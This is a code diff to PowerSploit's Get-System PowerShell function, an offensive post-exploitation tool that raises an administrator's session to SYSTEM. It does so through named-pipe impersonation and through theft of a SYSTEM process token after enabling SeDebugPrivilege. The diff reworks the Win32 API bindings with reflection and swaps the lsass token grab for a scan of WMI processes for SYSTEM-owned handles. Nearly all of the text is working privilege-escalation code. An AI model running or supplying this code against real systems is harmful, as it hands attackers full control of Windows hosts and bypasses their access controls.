@@ -8,8 +8,11 @@ function Get-System {
         NOTE: if running PowerShell 2.0, start powershell.exe with '-STA' to ensure
         token duplication works correctly.
 
+        PowerSploit Function: Get-System
         Author: @harmj0y, @mattifestation
         License: BSD 3-Clause
+        Required Dependencies: None
+        Optional Dependencies: None
 
     .PARAMETER Technique
 
@@ -39,10 +42,10 @@ function Get-System {
 
     .EXAMPLE
         
-        PS> Get-System -ServiceName 'PrivescSvc'
+        PS> Get-System -ServiceName 'PrivescSvc' -PipeName 'secret'
 
         Uses named impersonate to elevate the current thread token to SYSTEM
-        with a custom service name.
+        with a custom service and pipe name.
 
     .EXAMPLE
         
@@ -176,15 +179,14 @@ function Get-System {
         $PipeSecurity.AddAccessRule($AccessRule)
         $Pipe = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName,"InOut",100, "Byte", "None", 1024, 1024, $PipeSecurity)
 
+        $PipeHandle = $Pipe.SafePipeHandle.DangerousGetHandle()
+
+        # Declare/setup all the needed API function
+        #   adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html 
         $ImpersonateNamedPipeClientAddr = Get-ProcAddress Advapi32.dll ImpersonateNamedPipeClient
         $ImpersonateNamedPipeClientDelegate = Get-DelegateType @( [Int] ) ([Int])
         $ImpersonateNamedPipeClient = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateNamedPipeClientAddr, $ImpersonateNamedPipeClientDelegate)
 
-        $PipeHandle = $Pipe.SafePipeHandle.DangerousGetHandle()
-
-
-        # Declare/setup all the needed API function
-        #   adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html 
         $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle
         $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])
         $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)
@@ -266,7 +268,6 @@ function Get-System {
                         Start-Sleep -s 1
                     }
                     else{
-                        # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
                         if ($err -eq 1053){
                             Write-Verbose "Command didn't respond to start"
                         }
@@ -284,7 +285,6 @@ function Get-System {
                     $err = $GetLastError.Invoke()
 
                     if ($val -eq 0){
-                        # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
                         Write-Warning "DeleteService failed, LastError: $err"
                     }
                     else{
@@ -297,13 +297,11 @@ function Get-System {
                     Write-Verbose "Service handle closed off"
                 }
                 else {
-                    # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
                     Write-Warning "[!] OpenServiceA failed, LastError: $err"
                 }
             }
 
             else {
-                # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
                 Write-Warning "[!] CreateService failed, LastError: $err"
             }
 
@@ -334,6 +332,7 @@ function Get-System {
     #   needs SeDebugPrivilege
     # written by @mattifestation and adapted from https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot
     Function Local:Get-SystemToken {
+        [CmdletBinding()] param()
 
         $DynAssembly = New-Object Reflection.AssemblyName('AdjPriv')
         $AssemblyBuilder = [Appdomain]::Currentdomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
@@ -352,33 +351,114 @@ function Get-System {
         $LuidStruct = $LuidTypeBuilder.CreateType()
 
         $Luid_and_AttributesTypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType])
-        $Luid_and_AttributesTypeBuilder.DefineField('Luid', [LUID], 'Public') | Out-Null
+        $Luid_and_AttributesTypeBuilder.DefineField('Luid', $LuidStruct, 'Public') | Out-Null
         $Luid_and_AttributesTypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
         $Luid_and_AttributesStruct = $Luid_and_AttributesTypeBuilder.CreateType()
 
         $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
         $ConstructorValue = [Runtime.InteropServices.UnmanagedType]::ByValArray
         $FieldArray = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
+
         $TokenPrivilegesTypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType])
         $TokenPrivilegesTypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
-        $PrivilegesField = $TokenPrivilegesTypeBuilder.DefineField('Privileges', [LUID_AND_ATTRIBUTES[]], 'Public')
+        $PrivilegesField = $TokenPrivilegesTypeBuilder.DefineField('Privileges', $Luid_and_AttributesStruct.MakeArrayType(), 'Public')
         $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 1))
         $PrivilegesField.SetCustomAttribute($AttribBuilder)
         $TokenPrivilegesStruct = $TokenPrivilegesTypeBuilder.CreateType()
 
-        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]), 'advapi32.dll', @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')), @([Bool] $True))
+        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(
+            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
+            'advapi32.dll',
+            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),
+            @([Bool] $True)
+        )
+
+        $AttribBuilder2 = New-Object Reflection.Emit.CustomAttributeBuilder(
+            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
+            'kernel32.dll',
+            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),
+            @([Bool] $True)
+        )
 
         $Win32TypeBuilder = $ModuleBuilder.DefineType('Win32Methods', $Attributes, [ValueType])
-        $Win32TypeBuilder.DefinePInvokeMethod('DuplicateToken', 'advapi32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([IntPtr], [Int32], [IntPtr].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto').SetCustomAttribute($AttribBuilder)
-        $Win32TypeBuilder.DefinePInvokeMethod('SetThreadToken', 'advapi32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([IntPtr], [IntPtr]), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto').SetCustomAttribute($AttribBuilder)
-        $Win32TypeBuilder.DefinePInvokeMethod('OpenProcessToken', 'advapi32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([IntPtr], [UInt32], [IntPtr].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto').SetCustomAttribute($AttribBuilder)
-        $Win32TypeBuilder.DefinePInvokeMethod('LookupPrivilegeValue', 'advapi32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([String], [String], [IntPtr].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto').SetCustomAttribute($AttribBuilder)
-        $Win32TypeBuilder.DefinePInvokeMethod('AdjustTokenPrivileges', 'advapi32.dll', [Reflection.MethodAttributes] 'Public, Static', [Reflection.CallingConventions]::Standard, [Bool], @([IntPtr], [Bool], [TokPriv1Luid].MakeByRefType(), [Int32], [IntPtr], [IntPtr]), [Runtime.InteropServices.CallingConvention]::Winapi, 'Auto').SetCustomAttribute($AttribBuilder)
-        $Win32TypeBuilder.CreateType() | Out-Null
+        $Win32TypeBuilder.DefinePInvokeMethod(
+            'OpenProcess',
+            'kernel32.dll',
+            [Reflection.MethodAttributes] 'Public, Static',
+            [Reflection.CallingConventions]::Standard,
+            [IntPtr],
+            @([UInt32], [Bool], [UInt32]),
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            'Auto').SetCustomAttribute($AttribBuilder2)
+
+        $Win32TypeBuilder.DefinePInvokeMethod(
+            'CloseHandle',
+            'kernel32.dll',
+            [Reflection.MethodAttributes] 'Public, Static',
+            [Reflection.CallingConventions]::Standard,
+            [Bool],
+            @([IntPtr]),
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            'Auto').SetCustomAttribute($AttribBuilder2)
+
+        $Win32TypeBuilder.DefinePInvokeMethod(
+            'DuplicateToken',
+            'advapi32.dll',
+            [Reflection.MethodAttributes] 'Public, Static',
+            [Reflection.CallingConventions]::Standard,
+            [Bool],
+            @([IntPtr], [Int32], [IntPtr].MakeByRefType()),
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            'Auto').SetCustomAttribute($AttribBuilder)
+
+        $Win32TypeBuilder.DefinePInvokeMethod(
+            'SetThreadToken',
+            'advapi32.dll',
+            [Reflection.MethodAttributes] 'Public, Static',
+            [Reflection.CallingConventions]::Standard,
+            [Bool],
+            @([IntPtr], [IntPtr]),
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            'Auto').SetCustomAttribute($AttribBuilder)
+
+        $Win32TypeBuilder.DefinePInvokeMethod(
+            'OpenProcessToken',
+            'advapi32.dll',
+            [Reflection.MethodAttributes] 'Public, Static',
+            [Reflection.CallingConventions]::Standard,
+            [Bool],
+            @([IntPtr], [UInt32], [IntPtr].MakeByRefType()),
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            'Auto').SetCustomAttribute($AttribBuilder)
+
+        $Win32TypeBuilder.DefinePInvokeMethod(
+            'LookupPrivilegeValue',
+            'advapi32.dll',
+            [Reflection.MethodAttributes] 'Public, Static',
+            [Reflection.CallingConventions]::Standard,
+            [Bool],
+            @([String], [String], [IntPtr].MakeByRefType()),
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            'Auto').SetCustomAttribute($AttribBuilder)
+
+        $Win32TypeBuilder.DefinePInvokeMethod(
+            'AdjustTokenPrivileges',
+            'advapi32.dll',
+            [Reflection.MethodAttributes] 'Public, Static',
+            [Reflection.CallingConventions]::Standard,
+            [Bool],
+            @([IntPtr], [Bool], $TokPriv1LuidStruct.MakeByRefType(),[Int32], [IntPtr], [IntPtr]),
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            'Auto').SetCustomAttribute($AttribBuilder)
+        
+        $Win32Methods = $Win32TypeBuilder.CreateType()
 
         $Win32Native = [Int32].Assembly.GetTypes() | ? {$_.Name -eq 'Win32Native'}
-        $GetCurrentProcess = $Win32Native.GetMethod('GetCurrentProcess', [Reflection.BindingFlags] 'NonPublic, Static')
-        
+        $GetCurrentProcess = $Win32Native.GetMethod(
+            'GetCurrentProcess',
+            [Reflection.BindingFlags] 'NonPublic, Static'
+        )
+            
         $SE_PRIVILEGE_ENABLED = 0x00000002
         $STANDARD_RIGHTS_REQUIRED = 0x000F0000
         $STANDARD_RIGHTS_READ = 0x00020000
@@ -392,40 +472,81 @@ function Get-System {
         $TOKEN_ADJUST_DEFAULT = 0x00000080
         $TOKEN_ADJUST_SESSIONID = 0x00000100
         $TOKEN_READ = $STANDARD_RIGHTS_READ -bor $TOKEN_QUERY
-        $TOKEN_ALL_ACCESS = $STANDARD_RIGHTS_REQUIRED -bor $TOKEN_ASSIGN_PRIMARY -bor $TOKEN_DUPLICATE -bor $TOKEN_IMPERSONATE -bor $TOKEN_QUERY -bor $TOKEN_QUERY_SOURCE -bor $TOKEN_ADJUST_PRIVILEGES -bor $TOKEN_ADJUST_GROUPS -bor $TOKEN_ADJUST_DEFAULT -bor $TOKEN_ADJUST_SESSIONID
+        $TOKEN_ALL_ACCESS = $STANDARD_RIGHTS_REQUIRED -bor
+            $TOKEN_ASSIGN_PRIMARY -bor
+            $TOKEN_DUPLICATE -bor
+            $TOKEN_IMPERSONATE -bor
+            $TOKEN_QUERY -bor
+            $TOKEN_QUERY_SOURCE -bor
+            $TOKEN_ADJUST_PRIVILEGES -bor
+            $TOKEN_ADJUST_GROUPS -bor
+            $TOKEN_ADJUST_DEFAULT -bor
+            $TOKEN_ADJUST_SESSIONID
 
         [long]$Luid = 0
 
-        $tokPriv1Luid = New-Object TokPriv1Luid
+        $tokPriv1Luid = [Activator]::CreateInstance($TokPriv1LuidStruct)
         $tokPriv1Luid.Count = 1
         $tokPriv1Luid.Luid = $Luid
         $tokPriv1Luid.Attr = $SE_PRIVILEGE_ENABLED
 
-        $RetVal = [Win32Methods]::LookupPrivilegeValue($Null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid)
+        $RetVal = $Win32Methods::LookupPrivilegeValue($Null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid)
 
         $htoken = [IntPtr]::Zero
-        $RetVal = [Win32Methods]::OpenProcessToken($GetCurrentProcess.Invoke($Null, @()), $TOKEN_ALL_ACCESS, [ref]$htoken)
+        $RetVal = $Win32Methods::OpenProcessToken($GetCurrentProcess.Invoke($Null, @()), $TOKEN_ALL_ACCESS, [ref]$htoken)
 
-        $tokenPrivileges = New-Object TOKEN_PRIVILEGES
-        $RetVal = [Win32Methods]::AdjustTokenPrivileges($htoken, $False, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)
+        $tokenPrivileges = [Activator]::CreateInstance($TokenPrivilegesStruct)
+        $RetVal = $Win32Methods::AdjustTokenPrivileges($htoken, $False, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)
 
         if(-not($RetVal)) {
             Write-Error "AdjustTokenPrivileges failed, RetVal : $RetVal" -ErrorAction Stop
         }
+        
+        $LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value
 
-        $Process = (Get-Process -Name lsass)
-        [IntPtr]$hlsasstoken = [IntPtr]::Zero
-        $RetVal = [Win32Methods]::OpenProcessToken($Process.Handle, ($TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE), [ref]$hlsasstoken)
+        $SystemHandle = Get-WmiObject -Class Win32_Process | ForEach-Object {
+            try {
+                $OwnerInfo = $_.GetOwner()
+                if ($OwnerInfo.Domain -and $OwnerInfo.User) {
+                    $OwnerString = "$($OwnerInfo.Domain)\$($OwnerInfo.User)".ToUpper()
 
-        [IntPtr]$DulicateTokenHandle = [IntPtr]::Zero
-        $RetVal = [Win32Methods]::DuplicateToken($hlsasstoken, 2, [ref]$DulicateTokenHandle)
+                    if ($OwnerString -eq $LocalSystemNTAccount.ToUpper()) {
+                        $Process = Get-Process -Id $_.ProcessId
 
-        $retval = [Win32Methods]::SetThreadToken([IntPtr]::Zero, $DulicateTokenHandle)
-        if(-not($RetVal)) {
-            Write-Error "SetThreadToken failed, RetVal : $RetVal" -ErrorAction Stop
+                        $Handle = $Win32Methods::OpenProcess(0x0400, $False, $Process.Id)
+                        if ($Handle) {
+                            $Handle
+                        }
+                    }
+                }
+            }
+            catch {}
+        } | Where-Object {$_ -and ($_ -ne 0)} | Select -First 1
+        
+        if ((-not $SystemHandle) -or ($SystemHandle -eq 0)) {
+            Write-Error 'Unable to obtain a handle to a system process.'
+        } 
+        else {
+            [IntPtr]$SystemToken = [IntPtr]::Zero
+            $RetVal = $Win32Methods::OpenProcessToken(([IntPtr][Int] $SystemHandle), ($TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE), [ref]$SystemToken);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+            Write-Verbose "OpenProcessToken result: $RetVal"
+            Write-Verbose "OpenProcessToken result: $LastError"
+
+            [IntPtr]$DulicateTokenHandle = [IntPtr]::Zero
+            $RetVal = $Win32Methods::DuplicateToken($SystemToken, 2, [ref]$DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+            Write-Verbose "DuplicateToken result: $LastError"
+
+            $RetVal = $Win32Methods::SetThreadToken([IntPtr]::Zero, $DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            if(-not($RetVal)) {
+                Write-Error "SetThreadToken failed, RetVal : $RetVal" -ErrorAction Stop
+            }
+
+            Write-Verbose "SetThreadToken result: $LastError"
+            $null = $Win32Methods::CloseHandle($Handle)
         }
     }
-
 
     if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
         Write-Error "Script must be run as administrator" -ErrorAction Stop
